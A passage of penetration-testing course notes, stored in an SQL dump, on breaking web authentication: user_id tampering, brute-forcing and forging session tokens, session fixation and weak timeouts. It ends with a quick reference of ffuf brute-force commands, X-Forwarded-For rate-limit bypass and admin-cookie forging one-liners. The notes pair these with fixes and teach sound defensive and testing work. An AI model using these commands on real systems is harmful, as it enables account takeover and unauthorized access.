An authentication implementation is flawed if it depends on the **presence or value of an HTTP parameter**. If the app decides who you are based on a parameter you control, you can modify it to bypass authentication or escalate privileges. This is closely related to authorization flaws like **Insecure Direct Object Reference (IDOR)**. In the lab, we log in as `htb-stdnt` and land on `/admin.php?user_id=183`, but we only see partial data (limited privileges). The `user_id` parameter looks significant, so we probe it: **removing** `user_id` from the request redirects us back to `/index.php` even though our `PHPSESSID` cookie is still valid — which tells us the app is using `user_id`, not just the session, to gate access.

**Step 1 — Observe the authenticated URL:** `/admin.php?user_id=183` (partial data visible).

**Step 2 — Remove the parameter** to test its role:

```http
GET /admin.php HTTP/1.1
Cookie: PHPSESSID=<valid session>
```

Result: redirected to `/index.php` despite a valid session → `user_id` is tied to authentication.

**More detail — what "the session alone isn''t enough" proves.** This is the smoking gun. A correctly built app derives *everything* about who you are from the server-side session the moment you log in; it never needs you to re-tell it your identity. So when removing a parameter kicks you back to the login *despite a valid session cookie*, the app is clearly basing an access decision on that parameter rather than on the session — which means you control part of the access logic. That''s your cue to start tampering with the parameter''s value.

**Step 3 — Access the endpoint directly with the parameter** to bypass the redirect:

```
/admin.php?user_id=183
```

**More detail — the reasoning that makes this a finding.** The crucial deduction is in step 2: a *valid session* alone is **not** enough to view the page — the app also demands the `user_id` parameter. That tells you the application is making an access decision based on a value the **client** supplies, rather than deriving everything from the trusted server-side session. Any time authentication or authorization depends on a request parameter, header, or cookie *field* that the user can change, you have a candidate bypass. The parameter name is a strong hint, too: `user_id`, `uid`, `role`, `is_admin`, `account`, `group`, and similar names advertise exactly what to tamper with.

---

## 11.2 Escalating via User IDs

The parameter name `user_id` strongly implies it identifies *which user* is viewing the page. If you can **guess or brute-force the user ID of an administrator**, you can load `/admin.php` with that ID and see the page with administrative privileges — revealing admin-only information. This turns a simple parameter into a privilege-escalation lever: the app trusts the `user_id` you supply rather than deriving it securely from your session. You find the admin''s ID using the same brute-force techniques covered earlier, then substitute it into the parameter.

**Step 1 — Brute-force or guess the administrator''s `user_id`** (IDs are often small integers, so iterate a range).

**Step 2 — Request the page as that user:**

```
/admin.php?user_id=<admin_id>
```

With the admin''s ID in the parameter, the page renders with administrative privileges — a full authentication/authorization bypass.

**More detail — brute-forcing the ID efficiently.** User IDs are usually small sequential integers, so you rarely need a huge wordlist. Generate a numeric range and fuzz the parameter, watching for a response whose **size** or **content** differs (admin pages typically contain *more* data than a regular user''s):

```bash
$ seq 1 1000 > ids.txt
$ ffuf -w ./ids.txt -u "http://172.17.0.2/admin.php?user_id=FUZZ" \
  -b "PHPSESSID=<valid session>" -fs 2317
```

- `seq 1 1000` — candidate IDs 1–1000 (widen if needed).
- `-b "PHPSESSID=..."` — your valid low-priv session, required so each request is "authenticated."
- `-fs 2317` — filter out the normal (low-priv) response size, so any ID returning a *different*-sized page (likely the admin''s richer page) stands out. You could equally filter on words/lines or match a known admin-only string with `-mr "Admin Panel"`.

**More detail — horizontal vs vertical escalation.** Changing `user_id` to *another normal user''s* ID is **horizontal** escalation (you see data you shouldn''t, at the same privilege level) — an IDOR. Changing it to an *administrator''s* ID is **vertical** escalation (you gain higher privileges). Both are serious; call out which one you achieved in the report, since vertical escalation to admin is usually Critical while horizontal access to one peer''s record may be High depending on the data.

**More detail — confirm the escalation cleanly.** To prove the finding without doubt, show the *same* request differing only by the ID producing *different privilege levels*: your own ID returns your limited data, the admin''s ID returns admin-only content. Capture both responses side by side — that single before/after is the clearest possible evidence that access is decided by the client-controlled ID rather than the session.

**Final remark:** Many more advanced bugs can also bypass authentication — PHP type juggling (Whitebox Attacks module), injection-based bypasses (Injection Attacks and SQL Injection Fundamentals modules), and logic bugs (Parameter Logic Bugs module) — but all share the theme of the app trusting something the attacker controls.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Authentication/authorization gated by a client-controlled `user_id` parameter.
>
> **Reproduction:**
> ```text
> # Logged in as htb-stdnt -> /admin.php?user_id=183 (partial data)
> # Remove user_id -> redirected to /index.php (parameter gates access)
> # Supply an admin''s user_id -> /admin.php?user_id=<admin_id> -> admin data
> ```
>
> **Evidence / Notes:** Access control relies on a user-supplied `user_id` rather than the authenticated session, enabling horizontal/vertical privilege escalation by changing the ID (IDOR-style). **Severity: High–Critical.** Fix: derive the user identity from the server-side session only; never trust a client-supplied identifier for access decisions.
>
> **Screenshot placeholder:** `[ Attach partial data vs admin data after user_id change ]`

---

# 12. Attacking Session Tokens

---

## 12.1 Brute-Forcing Weak Session Tokens

Authentication flaws can arise not just from the login logic but from how **session tokens** are handled. A session token is a unique identifier tied to a user''s session; if an attacker obtains another user''s valid token, they can impersonate that user and hijack the session. When a token has **insufficient entropy** — too short, or mostly static — it can be brute-forced, just like a reset token. The clearest case is a tiny token: a web app assigning a **4-character** session (`Set-Cookie: session=a5fd`) can be exhaustively brute-forced to hijack any active session.

**More detail — what makes session hijacking so impactful.** If you obtain another user''s valid session token, you *become* that user to the application — no password, no 2FA, no questions. The session token is the thing the app checks on every request *after* login, so possessing it skips the entire front door. That''s why weak session tokens are so dangerous: brute-forcing a 4-character token (65,536 values) or guessing an incrementing ID doesn''t just compromise one account, it potentially compromises **every currently active session** at once. And unlike a password, the victim can''t "change" an active session you''ve already captured — you ride it until it expires (which, per section 13.2, might be never). This is also why session tokens must get the *same* protection as passwords: high entropy plus rate-limited endpoints.

**More detail — how you''d brute-force a session token in practice.** It''s the same `ffuf` approach as the other brute-forces, but you fuzz the **cookie** and look for an *authenticated* response. For a 4-char hex token you''d generate the keyspace and test each as the session cookie, filtering out the "not logged in" response:

```bash
# Generate all 4-char lowercase-hex tokens (adjust charset/length to the real token)
$ crunch 4 4 0123456789abcdef -o sess.txt
$ ffuf -w sess.txt -u http://TARGET/admin.php -b "session=FUZZ" -fr "Please log in"
```

- `crunch 4 4 0123456789abcdef` — every 4-character string over the hex alphabet.
- `-b "session=FUZZ"` — the candidate token goes in the cookie, not the body/URL.
- `-fr "Please log in"` — hide unauthenticated responses; a hit returns an authenticated page. For the "mostly static" variant, only fuzz the *random* middle characters to shrink the space.

A more common, sneakier variant has a *long* token where most of it is **static** and only a small part is random. Capturing several tokens reveals the pattern:

```txt
2c0c58b27c71a2ec5bf2b4b6e892b9f9
2c0c58b27c71a2ec5bf2b4546092b9f9
2c0c58b27c71a2ec5bf2b497f592b9f9
2c0c58b27c71a2ec5bf2b48bcf92b9f9
2c0c58b27c71a2ec5bf2b4735e92b9f9
```

Of the 32 characters, 28 are identical across all five sessions: the token is `2c0c58b27c71a2ec5bf2b4` + **4 random chars** + `92b9f9`. Only those 4 characters need brute-forcing, collapsing a seemingly strong 32-char token into a trivial search space.

An even weaker case is an **incrementing** identifier:

```txt
141233
141234
141237
141238
141240
```

These are just incrementing numbers, so enumerating all past and future sessions is trivial — increment or decrement to land on other users'' active sessions. **Lesson:** always capture *multiple* tokens and analyze them for static segments or sequential patterns before assuming they''re secure.

**More detail — thinking in terms of entropy.** "Entropy" is just a measure of how many possibilities a token really has, expressed in bits. Each truly random character adds entropy; static characters add none. The brute-force cost is roughly 2^(bits of entropy):

| Token | Apparent length | *Effective* random part | Rough keyspace |
|-------|-----------------|-------------------------|----------------|
| `a5fd` | 4 hex | 4 hex (16 bits) | 65,536 |
| `2c0c…92b9f9` (28 static) | 32 hex | 4 hex (16 bits) | 65,536 |
| incrementing `14123x` | 6 digits | ~0 (predictable) | a handful |
| proper random | 32 hex | 32 hex (128 bits) | 3.4 × 10³⁸ |

The lesson the table drives home: **length is not strength**. A 32-character token with only 4 random characters is exactly as weak as a 4-character token. This is *why* you capture several tokens and diff them — the static portion is invisible from a single sample but obvious across five. Only the random portion counts toward the real keyspace you''d have to brute-force.

**More detail — a quick way to diff captured tokens.** Paste the captured tokens into a file and let the shell show you which columns change:

```bash
# Highlight differing characters across captured tokens
$ cat tokens_captured.txt
2c0c58b27c71a2ec5bf2b4b6e892b9f9
2c0c58b27c71a2ec5bf2b4546092b9f9
2c0c58b27c71a2ec5bf2b497f592b9f9
```

Line them up vertically (a monospace view or a quick diff) and the static prefix/suffix jumps out, leaving only the random middle — the part that defines the real keyspace you''d target.

---

## 12.2 Predictable & Tamperable Session Tokens

In a more realistic scenario, a token *looks* random but is actually **predictable** because it encodes tamperable data. The simplest form is a token that''s just **encoded** (not signed or encrypted) user data. Analyze any suspicious token for base64, hex, or URL encoding. For example, decoding a base64 token reveals readable fields:

**Step 1 — Decode a base64 session token:**

```bash
$ echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d
user=htb-stdnt;role=user
```

The token plainly contains `user` and `role` with no integrity protection — nothing stops us from tampering.

**Step 2 — Forge an admin token** by editing the data and re-encoding:

```bash
$ echo -n ''user=htb-stdnt;role=admin'' | base64
dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==
```

Send this forged cookie to gain administrative access — a privilege escalation with no cracking required.

**Step 3 — Handle other encodings the same way.** A hex-encoded token like `757365723d...` decodes with `xxd`; forge the admin version by re-encoding:

```bash
$ echo -n ''user=htb-stdnt;role=admin'' | xxd -p
757365723d6874622d7374646e743b726f6c653d61646d696e
```

**On encrypted tokens:** some tokens contain *encrypted* data. Weak crypto, or injecting user input into the encryption function''s input, can still enable forgery and privilege escalation — but attacking encryption-based tokens blackbox (without source code) is usually much harder than attacking plain encodings.

**More detail — helpful tools for token analysis.** You can do most of this with `base64`/`xxd`, but a few tools speed things up: **CyberChef** (a browser "Swiss-army knife" for chained decode/encode/magic-detection — paste a token and let "Magic" guess the encoding), **jwt_tool** and **jwt.io** for inspecting and testing JWTs (including `alg:none` and signature checks), **hashcat** mode 16500 for cracking weak JWT HMAC secrets, and **Burp''s Inspector/Decoder** for live decode while you intercept. Reach for these when a token is layered (e.g. base64 of hex of JSON) or when you need to test whether a signature is actually enforced.

**More detail — how to recognize what encoding a token uses.** Before you can tamper, you have to spot the encoding. Quick tells:

| Clue | Likely encoding | Decode with |
|------|-----------------|-------------|
| Letters `A–Z a–z 0–9 + /`, often ends in `=`/`==` | Base64 | `base64 -d` |
| URL-safe variant uses `-` and `_` instead of `+` `/` | Base64URL (common in JWTs) | convert `-_`→`+/`, then `base64 -d` |
| Only `0–9 a–f`, even length | Hex | `xxd -p -r` or `echo -n .. | xxd -p` to re-encode |
| Contains `%` sequences (`%3D`, `%2F`) | URL-encoded | `urldecode` / a small Python/CyberChef step |
| Three dot-separated base64url parts `xxx.yyy.zzz` | **JWT** | decode each part; see JWT note below |

A fast way to test a mystery string is to just try decoding it: `echo -n ''<token>'' | base64 -d` — if it returns readable `key=value` text, you''ve found plain, tamperable data.

**More detail — base64 gotchas when re-encoding.** Two things trip people up. First, use `echo -n` (no trailing newline) when encoding, or the newline becomes part of the encoded value and the server rejects it. Second, length changes the padding: `role=user` and `role=admin` are different lengths, so the re-encoded token''s trailing `=` padding will differ — that''s expected, not an error. Always re-encode the *entire* forged string in one go rather than trying to patch bytes in the existing token.

**More detail — the JWT case.** If the token is a JWT (`header.payload.signature`), the header and payload are just base64url-encoded JSON you can read, but the signature protects them. You can''t simply flip `"role":"user"` to `"role":"admin"` unless the app fails to verify the signature, accepts `alg:none`, or uses a weak/known signing key you can brute-force (e.g. with `hashcat` mode 16500 or `jwt_tool`). So: decode to read the claims, then test whether the signature is actually enforced before assuming you can forge one. Proper JWT verification (strong secret, pinned algorithm) is the correct defense.

**More detail — the capture-and-analyze habit.** For *any* token — encoded or not — capture **5–10 fresh tokens** and lay them side by side (as in section 12.1). Look for: static prefixes/suffixes, a small changing middle, sequential numbers, timestamps, or embedded usernames/IDs. This single habit catches the majority of weak-token issues before you even try to decode anything.

**More detail — how session tokens leak in the first place.** Forging a weak token is one route; simply *stealing* a strong one is the other, and it''s often easier. Session tokens commonly leak through: **XSS** (JavaScript reading `document.cookie` when the cookie lacks `HttpOnly`), **network sniffing** (a cookie sent over plain HTTP without the `Secure` flag), **referer leakage** (a token in a URL sent to third-party resources), **logs** (tokens in URLs recorded by servers/proxies), and **fixation** (section 13.1). The relevant cookie flags are your quick audit: `HttpOnly` blocks JS access (anti-XSS theft), `Secure` forces HTTPS-only transmission, and `SameSite` restricts cross-site sending (anti-CSRF). Note any session cookie missing these flags — it widens every theft vector above.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Session token is base64-encoded, unsigned user data → trivial privilege escalation.
>
> **Reproduction:**
> ```bash
> $ echo -n ''<captured cookie>'' | base64 -d
> user=htb-stdnt;role=user
>
> $ echo -n ''user=htb-stdnt;role=admin'' | base64
> dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==
> # Send forged cookie -> GET /admin.php returns 200 (admin access)
> ```
>
> **Evidence / Notes:** The `session` cookie encodes `user` and `role` with no signature/integrity check, so changing `role=user` to `role=admin` and re-encoding forges an administrative session. Also observed weak-entropy tokens (28/32 static chars) and incrementing IDs in other flows. **Severity: Critical.** Fix: use long, random, server-side session identifiers (or signed tokens like properly-verified JWTs); never store trust-bearing data client-side unprotected.
>
> **Screenshot placeholder:** `[ Attach decode + forged admin cookie + /admin.php 200 ]`

---

# 13. Further Session Attacks

---

## 13.1 Session Fixation

**Session fixation** lets an attacker obtain a victim''s valid session by forcing the victim to use a session token the *attacker already knows*. It happens when a web app does **not assign a new session token after successful authentication** — so a token set *before* login stays valid *after* login. If the attacker can plant a known token in the victim''s browser (for example, via a `sid` parameter the app honors), then once the victim logs in, the attacker — who knows that same token — can hijack the authenticated session.

****More detail — fixation vs hijacking, the key difference.** Both end with the attacker owning the victim''s session, but the direction is reversed. In normal **session hijacking** (section 12), the attacker *steals* a token the victim already has. In **session fixation**, the attacker *supplies* a token to the victim *in advance*, then waits for the victim to authenticate it. Fixation is sneaky because the attacker never has to steal anything — they just plant a value they already know and let the victim "upgrade" it to an authenticated session by logging in. The single fix (rotate the token on login) defeats it completely, because the value the attacker planted becomes worthless the instant the victim authenticates.

The four-step attack:**

1. The attacker authenticates to get a valid token (e.g. `a1b2c3d4e5f6`), then logs out to free it.
2. The attacker tricks the victim into using that token via a crafted link: `http://vulnerable.htb/?sid=a1b2c3d4e5f6`. The app obligingly sets it:
   ```http
   HTTP/1.1 200 OK
   Set-Cookie: session=a1b2c3d4e5f6
   ```
3. The victim logs in. Because the app doesn''t rotate the token on login, the victim keeps using the attacker-known token.
4. The attacker, knowing `a1b2c3d4e5f6`, hijacks the now-authenticated session.

**More detail — how the victim gets coerced into using the token.** Step 2 is the part that needs the victim''s cooperation (knowingly or not), and attackers have several ways to deliver the fixed token:

- **A crafted link** — the most common: `http://vulnerable.htb/?sid=<known token>` sent via email, chat, or a malicious ad. When the victim clicks, the app sets the cookie to the attacker''s value.
- **A cross-subdomain cookie** — if the attacker controls or can inject into any subdomain, they may set a cookie scoped to the parent domain, planting the token site-wide.
- **An XSS on the target** — a reflected or stored XSS lets the attacker run `document.cookie = "session=<known token>"` in the victim''s browser.
- **A meta-refresh or redirect** from an attacker-controlled page that lands on the token-setting URL.

The deliverability depends on how the app accepts the session ID — URL parameter acceptance makes it trivial; cookie-only, server-set sessions make it hard. Noting *which* applies is part of assessing the real risk.

**The fix:** always **generate a fresh, random session token after successful authentication**, invalidating any pre-login token so a fixed value can''t carry over.

**More detail — how an attacker plants the token.** Step 2 assumes the app will accept a session value from somewhere the attacker controls. In practice that happens when the app reads the session ID from a **URL parameter** (`?sid=...`, `?PHPSESSID=...`), from a **cookie the attacker can set** (via an XSS on the same domain, or a subdomain that can write a parent-domain cookie), or from a **hidden form field**. The classic PHP footgun is `session.use_trans_sid` / accepting the session ID from the query string. If the app only ever reads the session from a server-set `Set-Cookie` and ignores client-supplied IDs, fixation is much harder.

**More detail — how to test for fixation quickly.** (1) Note your session cookie *before* logging in. (2) Log in. (3) Compare the cookie *after* login. If it''s the **same value**, the app didn''t rotate the token → vulnerable to fixation. If it changed to a new random value, that specific defense is in place.

---

## 13.2 Improper Session Timeout

A web app must enforce a proper **session timeout** — a time after which a session expires and its token is rejected. Without one, a session token stays valid **indefinitely**, so a hijacked session can be used forever, massively amplifying the damage of any token theft. The correct timeout value depends on the app''s business and risk profile; there''s no universal number. A high-sensitivity app (for example, one handling health data) should expire sessions within **minutes**, while a low-risk app like a social network might allow **hours**. The key point for an attacker is that long-lived or never-expiring sessions make stolen tokens far more valuable; for a defender, tuning the timeout to the data''s sensitivity is essential.

**Testing checklist:**

- Capture a valid session token, wait, and re-use it — does it still work after a long idle period?
- Does logging out actually invalidate the token server-side, or does the token keep working?
- Is the timeout appropriate for the sensitivity of the data handled?

**More detail — two kinds of timeout, and testing each.** Secure apps enforce *both*:

- **Idle (inactivity) timeout** — the session expires after N minutes of no activity. Test it by authenticating, leaving the session untouched for longer than the suspected window, then reusing the token. If it still works, there''s no idle timeout.
- **Absolute timeout** — the session expires N hours after login *no matter how active* you are. Test it by staying active past the expected absolute limit and seeing whether you''re eventually forced to re-authenticate.

**More detail — logout must invalidate server-side.** A subtle but common flaw: clicking "logout" deletes the cookie in the *browser* but the token is still accepted by the *server*. Test this directly — capture the token, log out, then replay the token with `curl`/Burp. If a protected page still returns `200`, logout isn''t truly invalidating the session, so a stolen token remains usable after the victim "logged out." Proper logout destroys the session server-side so the token is dead everywhere.

**More detail — matching timeout to risk.** There''s no universal value, so judge by the data: a banking or health app should expire sessions in **minutes** (e.g. 5–15 min idle), while a low-risk social app might allow **hours**. In a report, don''t just say "no timeout" — recommend a concrete value appropriate to the application''s data sensitivity, plus both idle and absolute limits, plus true server-side invalidation on logout.

---

### Documentation Example (CTF-style write-up)

> **Finding:** No session rotation on login (session fixation) + no session timeout.
>
> **Reproduction:**
> ```text
> # Fixation
> 1. Attacker gets token a1b2c3d4e5f6, logs out.
> 2. Victim opens http://vulnerable.htb/?sid=a1b2c3d4e5f6 -> Set-Cookie: session=a1b2c3d4e5f6
> 3. Victim logs in; token not rotated.
> 4. Attacker reuses a1b2c3d4e5f6 -> authenticated as victim.
>
> # Timeout
> - Captured token still valid after extended idle time / after logout.
> ```
>
> **Evidence / Notes:** The app keeps the pre-login token after authentication (fixation) and never expires sessions, so a planted or stolen token grants indefinite access. **Severity: High.** Fix: regenerate the session token on login, invalidate it on logout, and enforce an idle/absolute timeout matched to data sensitivity.
>
> **Screenshot placeholder:** `[ Attach fixed-token login + long-lived token reuse ]`

---

# 14. Module Summary & Methodology

---

You now have a complete picture of how authentication breaks and how to attack it. The table consolidates every technique in the module.

**More detail — a severity guide for these findings.** Severity depends on impact and ease of exploitation; use this as a starting point and adjust for the app''s context (what data/privileges the account holds):

| Finding | Typical severity | Why |
|---------|------------------|-----|
| Default admin credentials | Critical | Instant full admin, zero effort |
| 4-digit reset token, no limit | Critical | Any account takeover in seconds |
| 2FA bypass (brute-force/missing) | Critical | Defeats the strongest control |
| Weak/forgeable session token | Critical | Impersonate any user, often all at once |
| Reset logic (username swap) | Critical | Takeover of arbitrary accounts |
| Auth bypass (direct access / parameter) | High–Critical | Unauthenticated access to protected data |
| Weak password + no lockout | High | Account compromise via brute-force |
| Rate-limit bypass | High | Re-enables all brute-force attacks |
| Session fixation / no rotation | High | Session takeover under some conditions |
| No/weak session timeout | Medium–High | Amplifies any token theft |
| Guessable security questions | Medium–High | Account recovery abuse |
| Weak CAPTCHA | Medium | Removes an anti-automation control |
| User enumeration | Low–Medium | Enables/accelerates other attacks |

**More detail — chaining findings.** Individually "low" findings often combine into a critical attack chain, and strong reports show the chain, not just the parts. The canonical example: **user enumeration (Low)** gives you valid accounts → **no rate limiting (High)** lets you brute-force freely → **weak password policy (Medium)** means a common password works → **account takeover (Critical)**. Always ask how your findings stack: enumeration + spraying, or a weak reset token + no timeout, is far worse than the sum of its parts.



| Area | Attack | Key tool / payload |
|------|--------|--------------------|
| User enumeration | Differing error messages / timing | `ffuf -fr "Unknown user"` |
| Password | Policy-matched brute-force | `awk` filter + `ffuf -fr "Invalid username"` |
| Reset token | Brute-force weak numeric token | `seq -w 0 9999` + `ffuf` |
| 2FA | Brute-force short TOTP (no limit) | `ffuf` with session cookie + `otp=FUZZ` |
| Rate limit | Spoof `X-Forwarded-For` per request | Rotating header |
| CAPTCHA | Leaked solution / auto-solver | Read response / solver |
| Default creds | Try documented defaults | CIRT.net, SecLists, vendor docs |
| Reset logic | Guessable questions / username swap | City wordlist / change `username` |
| Direct access | Content in redirect body | Burp: `302` → `200` |
| Parameter bypass | Trust in `user_id` | Supply admin''s ID |
| Session tokens | Weak entropy / encoded data | Brute-force / base64/hex forge |
| Session handling | Fixation / no timeout | Plant known token / reuse old token |

The recurring theme across every section is that **authentication fails whenever the application trusts something the attacker can obtain, guess, or control** — a short code, a predictable token, a client-supplied parameter, an unrotated session. The defenses rhyme too: enforce **rate limiting and lockouts**, use **long random tokens** with proper **expiry** and **rotation**, return **generic error messages**, require **real MFA** with sufficient code length and submission limits, **change default credentials**, keep **consistent server-side state** through multi-step flows, and never trust client-controlled values (`user_id`, `X-Forwarded-For`, encoded cookies) for security decisions. The methodology never changes: **enumerate accounts, probe each authentication and recovery flow for weak secrets and logic bugs, analyze session tokens for predictability and tamperability, and document every finding with clean reproduction and a concrete fix.**

---

# 15. Appendix — Quick Reference

---

This appendix gathers the reusable pieces from the whole module — commands, filters, wordlists, and checklists — into copy-ready references. Use it once you already understand *why* each piece works from the sections above.

## 15.1 ffuf Command Patterns for Auth Attacks

```text
# User enumeration (filter out the "invalid user" message)
ffuf -w users.txt -u http://TARGET/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=invalid" -fr "Unknown user"

# Password brute-force (known user)
ffuf -w custom_wordlist.txt -u http://TARGET/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=FUZZ" -fr "Invalid username"

# Reset-token brute-force (GET parameter)
seq -w 0 9999 > tokens.txt
ffuf -w tokens.txt -u "http://TARGET/reset_password.php?token=FUZZ" \
  -fr "The provided token is invalid"

# 2FA / TOTP brute-force (needs authenticated session cookie)
ffuf -w tokens.txt -u http://TARGET/2fa.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=<session>" -d "otp=FUZZ" -fr "Invalid 2FA Code"

# Security-answer brute-force (needs session tied to target user)
ffuf -w city_wordlist.txt -u http://TARGET/security_question.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=<session>" -d "security_response=FUZZ" -fr "Incorrect response."

# user_id / IDOR escalation (filter out normal-size response)
seq 1 1000 > ids.txt
ffuf -w ids.txt -u "http://TARGET/admin.php?user_id=FUZZ" \
  -b "PHPSESSID=<session>" -fs <normal_size>

# Rate-limit bypass via rotating X-Forwarded-For (two wordlists, pitchfork)
ffuf -w passwords.txt:PASS -w ips.txt:IP -mode pitchfork \
  -u http://TARGET/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: IP" -d "username=admin&password=PASS" -fr "Invalid username"
```

## 15.2 ffuf Filter / Matcher Reference

```text
-fr / -mr   body regex        (filter / match)
-fc / -mc   status code
-fs / -ms   response size (bytes)
-fw / -mw   word count
-fl / -ml   line count
-t          threads (default 40)        -p   delay between requests (sec)
-rate       max requests/sec            -c   colorized     -v   verbose (full URLs)
-mode       pitchfork | clusterbomb     -w file:KEYWORD   bind wordlist to a keyword
```
Workflow: run once unfiltered → learn the *majority* (invalid) response on each dimension → filter that out so only the anomaly (the hit) remains.

## 15.3 Wordlist & Token Generation

```text
# Zero-padded numeric ranges (tokens, OTPs, PINs)
seq -w 0 9999 > tokens.txt            # 0000..9999

# Policy-matched passwords from rockyou (upper+lower+digit, >=10)
awk ''length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/'' rockyou.txt > custom_wordlist.txt

# City names from a world-cities CSV (security answers)
cut -d '','' -f1 world-cities.csv > city_wordlist.txt
grep Germany world-cities.csv | cut -d '','' -f1 > german_cities.txt

# Useful SecLists paths
Usernames/xato-net-10-million-usernames.txt
Passwords/Leaked-Databases/rockyou.txt
Passwords/Default-Credentials/
```

## 15.4 Encoding / Decoding One-Liners (session & reset tokens)

```bash
echo -n ''<token>'' | base64 -d            # decode base64
echo -n ''user=htb;role=admin'' | base64   # re-encode (use -n, no newline!)
echo -n ''<hex>'' | xxd -p -r              # decode hex
echo -n ''user=htb;role=admin'' | xxd -p   # re-encode hex
# JWT: split on ''.'', base64url-decode header & payload; check if signature is enforced
```

## 15.5 "Client IP" Headers to Try for Rate-Limit Bypass

```text
X-Forwarded-For   X-Real-IP   X-Client-IP   X-Originating-IP
X-Remote-IP   X-Remote-Addr   True-Client-IP   CF-Connecting-IP   Forwarded
```

## 15.6 Defender Checklist (map each finding to a fix)

| Weakness | Fix |
|----------|-----|
| User enumeration | Single generic error for all auth failures; constant-time code paths |
| Weak passwords / no lockout | Strong policy + rate limiting + lockout + MFA |
| Short reset token | Long random, single-use, short expiry, rate-limited; deliver out of URL |
| Short/unlimited OTP | 6+ digits, attempt limiting, short validity, invalidate on N failures |
| IP rate-limit bypass | Trust proxy layer only; ignore client forwarding headers for security |
| Weak CAPTCHA | Server-side-validated, single-use, fresh challenge; enforce on the request |
| Default credentials | Force change on first login; remove default accounts |
| Reset logic flaw | Consistent server-side state; verify username across every step |
| Redirect leaks body | `exit;` immediately after the redirect |
| Client-controlled identity | Derive identity/role from the server-side session only |
| Weak/encoded session token | Long random server-side IDs or signed tokens; no trust-bearing client data |
| Session fixation | Rotate the session token on login |
| No/poor timeout | Idle + absolute timeouts matched to data sensitivity; true server-side logout |

## 15.7 Practical Tips & Common Mistakes

A short field guide to avoid the mistakes that waste time or miss findings:

- **Always inspect raw traffic, not the browser view.** The browser hides `302`-body leaks, encodings, and hidden fields; Burp and `curl` show the truth.
- **Capture a baseline before fuzzing.** One known-bad request tells you exactly which response property to filter on.
- **Tailor the wordlist.** Match the password policy, the security question, and the token format before launching — a targeted list is faster and quieter.
- **Include the session cookie** on any step that depends on prior state (2FA, security answer, `user_id`). Forgetting it makes every attempt fail for the wrong reason.
- **Test every auth-adjacent flow**, not just login — registration, reset, 2FA, logout, "remember me", SSO, APIs.
- **Capture multiple tokens** (session and reset) and diff them before assuming they''re random.
- **Check the easy wins first** — default credentials and direct access take minutes and sometimes end the engagement immediately.
- **When blocked, pivot** — lockout → spraying; IP rate limit → header spoofing; strong login → weak reset flow.
- **Chain findings** — enumeration + no lockout + weak policy = account takeover; report the chain, not just the pieces.
- **Write the fix** — every finding should name a concrete mitigation from the module''s prevention sections.

## 15.8 End-to-End Methodology Flow

```text
1. Map every auth/recovery flow (login, register, reset, 2FA, "remember me", SSO, API).
2. Enumerate valid usernames (error messages, then timing).
3. Attack passwords (brute-force -> spraying -> credential stuffing if blocked).
4. Test MFA (brute-force short OTP, missing enforcement, flawed state).
5. Probe recovery (weak reset tokens, guessable questions, username-swap logic).
6. Check protections (rate limit via headers, CAPTCHA bugs).
7. Try defaults (vendor docs, CIRT.net, SecLists, SCADAPASS).
8. Test bypasses (direct access / 302->200, client-controlled parameters).
9. Analyze sessions (capture many tokens -> entropy, encoding, fixation, timeout).
10. Document each finding: reproduction, evidence, severity, concrete fix.
```

---

**Final word.** Authentication is the front door of almost every application, and these notes have shown how many different ways that door can be forced — through the lock (weak passwords, short tokens), around it (direct access, parameter tampering), with a copied key (session theft and forging), or through a side window (reset flows, 2FA bypasses, default accounts). Internalize the one question that unites them all — *what does the app trust that I can obtain, guess, or control?* — and apply the confirm → fingerprint → escalate → document loop to every flow you meet. Do that consistently, and no authentication implementation, however unfamiliar, will leave you without a plan.

*End of notes.*', NULL, 'PUBLISHED', 'PUBLIC', 94, NULL, 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792518897.556), to_timestamp(1792518897.556), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmvh0i3i6008nidhwq1fw9x2g', 'Introduction to Web Applications', 'introduction-to-web-applications', 'Foundational notes on how web applications are built and where they break — the client-server model and infrastructure models, front end vs back end, the front-end trinity (HTML, CSS, JavaScript), front-end vulnerabilities (sensitive data exposure, HTML injection, XSS, CSRF), the back-end stack (servers, web servers, databases, frameworks, APIs with SOAP/REST), and common and public vulnerabilities (broken auth, file upload, command injection, SQL injection) scored with CVSS.', '# Introduction to Web Applications 


## Table of Contents

1. [Introduction](#1-introduction)
   - 1.1 [What a Web Application Is](#11-what-a-web-application-is)
   - 1.2 [Web Applications vs Websites](#12-web-applications-vs-websites)
   - 1.3 [Web Applications vs Native OS Applications](#13-web-applications-vs-native-os-applications)
   - 1.4 [Web Application Distribution](#14-web-application-distribution)
   - 1.5 [Security Risks & Attacking Web Applications](#15-security-risks--attacking-web-applications)
2. [Web Application Layout](#2-web-application-layout)
   - 2.1 [The Three Layout Categories](#21-the-three-layout-categories)
   - 2.2 [Infrastructure Models](#22-infrastructure-models)
   - 2.3 [Web Application Components](#23-web-application-components)
   - 2.4 [Architecture (Three-Tier)](#24-architecture-three-tier)
   - 2.5 [Microservices & Serverless](#25-microservices--serverless)
   - 2.6 [Architecture Security](#26-architecture-security)
3. [Front End vs Back End](#3-front-end-vs-back-end)
   - 3.1 [The Front End](#31-the-front-end)
   - 3.2 [The Back End](#32-the-back-end)
   - 3.3 [Securing Front/Back End](#33-securing-frontback-end)
4. [HTML](#4-html)
